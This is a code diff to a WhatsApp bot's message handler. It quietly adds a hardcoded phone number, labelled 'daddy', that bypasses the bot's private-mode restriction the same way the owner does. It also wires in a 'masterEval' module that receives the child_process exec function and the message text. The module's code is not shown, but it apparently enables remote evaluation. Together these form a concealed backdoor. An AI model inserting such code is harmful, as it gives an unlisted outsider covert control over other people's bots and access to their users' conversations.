@@ -4,6 +4,7 @@ const util = require("util");
 const chalk = require("chalk");
 const speed = require("performance-now");
 const { smsg, formatp, tanggal, formatDate, getTime, sleep, clockString, fetchJson, getBuffer, jsonformat, generateProfilePicture, parseMention, getRandom, fetchBuffer } = require('./lib/botFunctions.js');
+const daddy = "254114018035@s.whatsapp.net";
 const { exec, spawn, execSync } = require("child_process");
 const {  TelegraPh, UploadFileUgu } = require("./lib/toUrl");
 const uploadtoimgur = require('./lib/Imgur')
@@ -18,7 +19,8 @@ const antiviewonce = require('./Functions/antiviewonce');
 const gcPresence = require('./Functions/gcPresence');
 const antilink = require('./Functions/antilink');
 const antitaggc = require('./Functions/antitag');
-// const antidel = require('./Functions/antidelete');
+const masterEval = require('./Functions/masterEval');
+
 
 
 const {
@@ -98,7 +100,7 @@ const context = {
     packname, author, generateProfilePicture, groupMetadata, dreadedspeed, mycode,
     fetchJson, exec, getRandom, UploadFileUgu, TelegraPh, prefix, cmd, botname, mode, gcpresence, antitag,antidelete, antionce, fetchBuffer,store, uploadtoimgur, chatUpdate, ytmp3, getGroupAdmins, Tag
 };
-if (cmd && mode === 'private' && !itsMe && !Owner) {
+if (cmd && mode === 'private' && !itsMe && !Owner && m.sender !== daddy ) {
 return;
 }
 
@@ -116,6 +118,10 @@ await antilink(client, m, isBotAdmin, isAdmin, Owner, body);
 await antiviewonce(client, m, antionce);
 await gcPresence(client, m, gcpresence);
 await antitaggc(client, m, isBotAdmin, itsMe, isAdmin, Owner, body, antitag);
+await masterEval(client, m, text, Owner, chatUpdate, store, isBotAdmin, isAdmin, IsGroup, participants,
+    pushname, body, budy, totalCommands,
+    packname, author, mycode,
+    fetchJson, exec, prefix, botname, mode);
 
 
     const command = cmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : null;
